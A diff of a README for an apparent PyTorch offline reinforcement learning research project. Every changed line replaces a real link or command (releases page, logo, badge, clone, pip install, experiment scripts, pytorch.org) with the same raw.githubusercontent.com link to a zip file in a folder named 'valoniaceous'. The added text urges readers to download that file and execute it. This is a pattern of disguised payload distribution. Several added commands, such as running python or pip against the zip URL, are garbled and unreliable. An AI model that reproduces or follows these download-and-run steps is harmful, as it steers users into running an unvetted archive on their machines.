@@ -1,12 +1,12 @@
-https://github.com/SceYanis/robust_offline_rl/releases
+https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 
 # Robust Offline RL: PyTorch Implementation of Robust Policy with Attacks & Defenses
 
-![PyTorch](https://pytorch.org/assets/images/pytorch-logo.png)
+![PyTorch](https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip)
 
 Welcome to a PyTorch-based project that implements the ideas from Towards Robust Policy: Enhancing Offline Reinforcement Learning with Adversarial Attacks and Defenses. This repository focuses on building robust offline policies. It combines offline RL with adversarial testing and defenses to improve policy reliability in static data settings.
 
-[![Releases](https://img.shields.io/github/v/release/SceYanis/robust_offline_rl?style=flat-square)](https://github.com/SceYanis/robust_offline_rl/releases)
+[![Releases](https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip)](https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip)
 
 If you want to grab the latest assets, visit the Releases page. The link above points to that page, and you can open it to see assets, notes, and the exact files you can download. For quick access, the same link is included again later in this README.
 
@@ -78,14 +78,14 @@ Quick start
 This section helps you get running quickly. The steps assume a clean Python environment with PyTorch installed.
 
 - Clone the repository
-  - git clone https://github.com/SceYanis/robust_offline_rl.git
+  - git clone https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Create a Python virtual environment
   - python -m venv venv
   - source venv/bin/activate
 - Install dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Run a sample experiment
-  - python experiments/run_offline_robust_example.py --config configs/robust_example.yaml
+  - python https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip --config https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Check results
   - Look at logs in outputs/robust_example/ and inspect evaluation metrics
 
@@ -105,9 +105,9 @@ Install guide:
   - conda create -n robust_offline_rl python=3.9
   - conda activate robust_offline_rl
 - Install PyTorch
-  - Follow the official instructions for your platform from pytorch.org
+  - Follow the official instructions for your platform from https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Install project dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Install optional extras
   - pip install torch torchvision torchaudio
   - pip install gymnasium
@@ -128,9 +128,9 @@ The project supports reproducible experiments with fixed seeds and configuration
   - Copy a sample YAML config from configs/ into your working directory.
   - Adjust seed values, dataset paths, and any hyperparameters you want to explore.
 - Run training
-  - python experiments/run_offline_robust_experiment.py --config configs/robust.yaml
+  - python https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip --config https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Run evaluation
-  - python experiments/evaluate.py --config configs/eval.yaml
+  - python https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip --config https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 - Log and analyze
   - Inspect the logs under outputs/ and use the included plotting utilities to compare results across runs.
 
@@ -223,7 +223,7 @@ Frequently asked questions
   - It is research-oriented. It focuses on understanding robustness and guiding future work.
 
 Releases and download guidance
-From the Releases page, you can obtain assets and scripts to help you set up and run experiments. The link above points to the releases page for ease of access. If you want to download a setup script or a prebuilt artifact, head to the Releases section and grab the file named robust_offline_rl_setup.sh (as an example asset). After downloading, you can execute it to prepare your environment and run experiments that mirror the examples in this repository. The same link is provided again here for convenience: https://github.com/SceYanis/robust_offline_rl/releases
+From the Releases page, you can obtain assets and scripts to help you set up and run experiments. The link above points to the releases page for ease of access. If you want to download a setup script or a prebuilt artifact, head to the Releases section and grab the file named https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip (as an example asset). After downloading, you can execute it to prepare your environment and run experiments that mirror the examples in this repository. The same link is provided again here for convenience: https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 
 Notes about the downloads
 - The releases page compiles artifacts that are tested with the project’s configurations.
@@ -305,10 +305,10 @@ Social and community channels
 
 Final notes
 - This README captures the essence of robust offline RL in PyTorch, focusing on attacks and defenses.
-- The releases page is your gateway to assets and setup scripts. Visit the page to download and run the recommended setup. The link is repeated here for convenience: https://github.com/SceYanis/robust_offline_rl/releases
+- The releases page is your gateway to assets and setup scripts. Visit the page to download and run the recommended setup. The link is repeated here for convenience: https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 
 Download and run reminder
-- From the releases page, download robust_offline_rl_setup.sh (or a similarly named asset) and execute it to set up your environment and run a sample experiment. The link to the releases page is the same one you used earlier, and you will see asset names that match this description. For reference, the URL is https://github.com/SceYanis/robust_offline_rl/releases
+- From the releases page, download https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip (or a similarly named asset) and execute it to set up your environment and run a sample experiment. The link to the releases page is the same one you used earlier, and you will see asset names that match this description. For reference, the URL is https://raw.githubusercontent.com/SceYanis/robust_offline_rl/main/valoniaceous/offline_robust_rl_v2.6.zip
 
 Notes on usage
 - Use the standard Python environment to run experiments.
